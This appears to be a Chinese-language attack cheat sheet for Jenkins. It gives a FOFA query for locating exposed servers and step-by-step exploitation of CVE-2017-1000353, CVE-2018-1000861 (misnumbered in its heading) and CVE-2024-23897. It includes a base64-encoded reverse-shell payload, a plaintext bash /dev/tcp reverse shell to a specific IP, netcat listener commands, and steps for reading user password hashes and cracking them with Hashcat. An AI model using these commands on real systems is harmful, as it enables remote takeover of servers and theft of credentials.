Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作

默认端口：8080

FOFA语法：app="Jenkins"

### 远程代码执行（CVE-2017-1000353）

##### 版本：

所有Jenkins主版本均受到影响(包括<=2.56版本)所有Jenkins LTS 均受到影响( 包括<=2.46.1版本)

##### 利用：

参考文章：

[Jenkins-CI 远程代码执行漏洞复现（CVE-2017-1000353）-CSDN博客](https://blog.csdn.net/m0_63082628/article/details/140200097)

[Jenkins 远程代码执行漏洞（CVE-2017-1000353） 复现-CSDN博客](https://blog.csdn.net/YouthBelief/article/details/121528843)

工具链接：https://link.zhihu.com/?target=https%3A//github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar

EXP:https://link.zhihu.com/?target=https%3A//github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py	



1.在exp的目录下执行命令生成反弹shell序列化字符串并保存到文件jenkins_poc.ser中：

```cmd
D:\jdk1.8.0_291\bin\java.exe java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTkuMjkuNjcuNC85ODk3IDA}|{base64,-d}|{bash,-i}"
```

------

```
bash -i >& /dev/tcp/47.94.236.117/9900 0>&1
```



2.还是在exp目录下执行命令发送数据包 执行命令

```
python3 exploit.py 目标主机+端口 jenkins_poc.ser

```

3.监听端口：

```
nv -lvvp 9897
```

### 远程命令执行（CVE-2018-10000861）

参考文章：[Jenkins 远程命令执行漏洞 (CVE-2018-1000861)复现-CSDN博客](https://blog.csdn.net/Myu_wzy/article/details/127430201)

##### 版本

- Jenkins主版本 <= 2.153
- Jenkins LTS版本 <= 2.138.3

##### 利用

1.监听端口：nc -lvp 12333

2.看文章，和2017的差不多

### 任意文件读取（CVE-2024-23897）

[Jenkins 任意文件读取(CVE-2024-23897)+后台用户密码提取哈希破解+反弹Shell 一条龙-CSDN博客](https://blog.csdn.net/qq_34594929/article/details/136446671)

1.服务器启动匿名读取权限

2.Jenkins 安装将有一个文件，其中列出了此处的所有有效用户。

- `/var/jenkins_home/users/users.xml`

3.在 Jenkins 上的每个用户文件夹中，始终有一个包含用户密码哈希的`config.xml`文件。读取文件夹中的`config.xml`

4.通过工具Hashcat破解哈希密码

5.登录后上传脚本文件。。。。。。[Jenkins 任意文件读取(CVE-2024-23897)+后台用户密码提取哈希破解+反弹Shell 一条龙-CSDN博客](https://blog.csdn.net/qq_34594929/article/details/136446671)